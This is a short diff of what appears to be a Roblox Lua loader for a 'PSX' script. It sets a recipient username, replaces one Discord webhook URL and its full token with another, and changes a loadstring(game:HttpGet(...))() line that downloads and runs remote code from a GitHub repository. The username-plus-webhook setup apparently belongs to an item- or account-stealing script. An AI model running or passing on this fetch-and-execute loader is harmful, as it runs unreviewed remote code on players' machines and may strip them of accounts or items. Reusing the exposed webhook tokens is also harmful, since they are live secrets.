@@ -1,5 +1,4 @@
 UserName = "tps_ramos1"
-WebHook = "https://discord.com/api/webhooks/1063900511943794758/I72vNmub2hgFv-HRVht0Td8kpWyQ4tzy0skabgQ29Z3Kp7B4xz-XZk_qLBbCLmmitG21"
-Mention = true 
+WebHook = "https://discord.com/api/webhooks/1063137516338815127/X28IGQ2opuqLUGW8oANygokhGJw9bx1EZP7YgoQwLRV8gi-MEPEOIijh6CkngFeYX2Md"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
